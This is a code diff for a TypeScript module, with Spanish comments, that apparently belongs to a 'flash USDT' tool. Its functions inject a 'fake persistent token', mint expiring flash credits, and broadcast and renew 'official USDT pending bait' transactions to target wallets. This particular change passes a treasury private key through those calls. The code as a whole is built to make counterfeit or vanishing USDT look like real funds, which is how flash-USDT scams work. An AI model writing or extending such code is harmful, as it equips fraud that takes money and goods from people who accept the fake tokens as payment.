@@ -34,7 +34,10 @@ import type {
   WalletUsdtOverview,
 } from "./types";
 
-export type EvmLabOptions = { labContractAddress?: Address };
+export type EvmLabOptions = {
+  labContractAddress?: Address;
+  treasuryPrivateKey?: `0x${string}`;
+};
 
 /** Modo 1 — token falso persistente */
 export async function injectFlashUsdt(
@@ -43,7 +46,7 @@ export async function injectFlashUsdt(
   network: EvmNetwork,
   options?: EvmLabOptions
 ): Promise<EvmInjectResult> {
-  if (!isEvmConfigured(network, options?.labContractAddress)) {
+  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
     return {
       success: true,
       simulated: true,
@@ -59,7 +62,7 @@ export async function injectFlashUsdt(
       return { success: false, error: "Dirección EVM destino inválida" };
     }
 
-    const walletClient = getWalletClient(network);
+    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
     const contractAddress = getLabContractAddress(network, options?.labContractAddress);
     const tokenAmount = toLabTokenUnits(amount);
 
@@ -102,7 +105,7 @@ export async function injectPendingFlashUsdt(
   const durationMinutes = clampFlashDurationMinutes(durationMinutesInput);
   const flashExpiresAt = new Date(Date.now() + durationMinutes * 60 * 1000).toISOString();
 
-  if (!isEvmConfigured(network, options?.labContractAddress)) {
+  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
     return {
       success: true,
       simulated: true,
@@ -122,7 +125,7 @@ export async function injectPendingFlashUsdt(
       return { success: false, error: "Dirección EVM destino inválida", flashActive: false };
     }
 
-    const walletClient = getWalletClient(network);
+    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
     const contractAddress = getLabContractAddress(network, options?.labContractAddress);
     const tokenAmount = toLabTokenUnits(amount);
     const durationSeconds = BigInt(flashDurationMinutesToSeconds(durationMinutes));
@@ -185,9 +188,10 @@ export async function injectPendingFlashUsdt(
 export async function renewOfficialUsdtPendingBait(
   toAddress: string,
   amount: number,
-  network: EvmNetwork
+  network: EvmNetwork,
+  options?: EvmLabOptions
 ): Promise<{ txHash?: Hash; error?: string }> {
-  if (!isEvmConfigured(network)) {
+  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
     return { txHash: `SIM_PENDING_${Date.now()}` as Hash };
   }
 
@@ -195,7 +199,12 @@ export async function renewOfficialUsdtPendingBait(
     return { error: "Dirección EVM destino inválida" };
   }
 
-  const txHash = await broadcastOfficialUsdtPendingBait(toAddress as Address, amount, network);
+  const txHash = await broadcastOfficialUsdtPendingBait(
+    toAddress as Address,
+    amount,
+    network,
+    options
+  );
   if (!txHash) {
     return { error: "No se pudo emitir cebo pending USDT oficial" };
   }
@@ -205,10 +214,11 @@ export async function renewOfficialUsdtPendingBait(
 async function broadcastOfficialUsdtPendingBait(
   toAddress: Address,
   amount: number,
-  network: EvmNetwork
+  network: EvmNetwork,
+  options?: EvmLabOptions
 ): Promise<Hash | undefined> {
   try {
-    const walletClient = getWalletClient(network);
+    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
     const officialAddress = getOfficialUsdtContractAddress(network);
     const decimals = getOfficialUsdtDecimals(network);
     const tokenAmount = toOfficialUsdtUnits(amount, decimals);
@@ -242,7 +252,7 @@ export async function renewFlashInject(
   const durationMinutes = clampFlashDurationMinutes(durationMinutesInput);
   const flashExpiresAt = new Date(Date.now() + durationMinutes * 60 * 1000).toISOString();
 
-  if (!isEvmConfigured(network, options?.labContractAddress)) {
+  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
     return {
       success: true,
       txHash: `SIM_RENEW_${Date.now()}` as Hash,
@@ -255,7 +265,7 @@ export async function renewFlashInject(
       return { success: false, error: "Dirección EVM destino inválida" };
     }
 
-    const walletClient = getWalletClient(network);
+    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
     const durationSeconds = BigInt(flashDurationMinutesToSeconds(durationMinutes));
 
     const txHash = await walletClient.writeContract({
@@ -279,7 +289,7 @@ export async function clearFlashCredit(
   network: EvmNetwork,
   options?: EvmLabOptions
 ): Promise<EvmBurnResult> {
-  if (!isEvmConfigured(network, options?.labContractAddress)) {
+  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
     return {
       success: true,
       simulated: true,
@@ -289,7 +299,7 @@ export async function clearFlashCredit(
   }
 
   try {
-    const walletClient = getWalletClient(network);
+    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
     const txHash = await walletClient.writeContract({
       address: getLabContractAddress(network, options?.labContractAddress),
       abi: FLASH_USDT_LAB_ABI,
@@ -316,7 +326,7 @@ export async function burnFlashUsdt(
     return clearFlashCredit(holderAddress, network, options);
   }
 
-  if (!isEvmConfigured(network, options?.labContractAddress)) {
+  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
     return {
       success: true,
       simulated: true,
@@ -326,7 +336,7 @@ export async function burnFlashUsdt(
   }
 
   try {
-    const walletClient = getWalletClient(network);
+    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
     const publicClient = getPublicClient(network);
     const contractAddress = getLabContractAddress(network, options?.labContractAddress);
 
@@ -371,11 +381,15 @@ export async function getFlashUsdtBalance(
   network: EvmNetwork,
   options?: EvmLabOptions
 ): Promise<EvmBalanceResult> {
-  const contractAddress = isEvmConfigured(network, options?.labContractAddress)
+  const contractAddress = isEvmConfigured(
+    network,
+    options?.labContractAddress,
+    options?.treasuryPrivateKey
+  )
     ? getLabContractAddress(network, options?.labContractAddress)
     : ("0x0000000000000000000000000000000000000001" as Address);
 
-  if (!isEvmConfigured(network, options?.labContractAddress)) {
+  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
     return {
       balance: "0",
       balanceRaw: "0",
@@ -406,15 +420,6 @@ export async function getOfficialUsdtBalance(
   const contractAddress = getOfficialUsdtContractAddress(network);
   const decimals = getOfficialUsdtDecimals(network);
 
-  if (!isEvmConfigured(network)) {
-    return {
-      balance: "0",
-      balanceRaw: "0",
-      contractAddress,
-      simulated: true,
-    };
-  }
-
   try {
     const publicClient = getPublicClient(network);
     const raw = await publicClient.readContract({
@@ -429,7 +434,7 @@ export async function getOfficialUsdtBalance(
       contractAddress,
     };
   } catch {
-    return { balance: "0", balanceRaw: "0", contractAddress };
+    return { balance: "0", balanceRaw: "0", contractAddress, simulated: false };
   }
 }
 
@@ -449,7 +454,7 @@ export async function getWalletUsdtOverview(
   const pendingBaitNum = pendingBaitActive ? (options?.pendingBaitAmount ?? 0) : 0;
   const officialMeta = getOfficialUsdtMeta(network);
 
-  if (!isEvmConfigured(network, options?.labContractAddress)) {
+  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
     const labBal = options?.simulatedLabAmount ?? 0;
     const flashActive =
       mode === "pending_flash" &&
@@ -536,7 +541,7 @@ export async function getTxStatus(
     return { confirmed: true, txHash, blockNumber: 0 };
   }
 
-  if (!isEvmConfigured(network, options?.labContractAddress)) {
+  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
     return { confirmed: false, pending: true, txHash };
   }
 
@@ -566,8 +571,12 @@ export async function getTxStatus(
   }
 }
 
-export function isLabEvmReady(network?: EvmNetwork, labContractAddress?: string | null): boolean {
-  return isEvmConfigured(network, labContractAddress);
+export function isLabEvmReady(
+  network?: EvmNetwork,
+  labContractAddress?: string | null,
+  treasuryPrivateKey?: `0x${string}` | null
+): boolean {
+  return isEvmConfigured(network, labContractAddress, treasuryPrivateKey);
 }
 
 export function getLabNetworkLabel(network: EvmNetwork): string {
